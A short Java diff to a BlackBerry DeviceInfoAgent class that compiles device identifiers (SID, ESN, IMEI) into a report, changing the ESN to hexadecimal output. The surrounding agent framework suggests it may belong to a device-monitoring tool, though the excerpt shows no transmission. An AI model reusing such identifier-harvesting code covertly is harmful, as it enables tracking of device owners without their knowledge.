@@ -15,6 +15,7 @@ import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.DataBuffer;
+import net.rim.device.api.util.NumberUtilities;
 import blackberry.Conf;
 import blackberry.Device;
 import blackberry.log.Log;
@@ -110,7 +111,7 @@ public final class DeviceInfoAgent extends Agent {
         if (device.isCDMA()) {
             sb.append("CDMA\n");
             sb.append("SID: " + device.getSid() + "\n");
-            sb.append("ESN: " + device.getEsn() + "\n");
+            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(),16) + "\n");
         } else {
             sb.append("GPRS\n");
             sb.append("IMEI: " + device.getImei() + "\n");
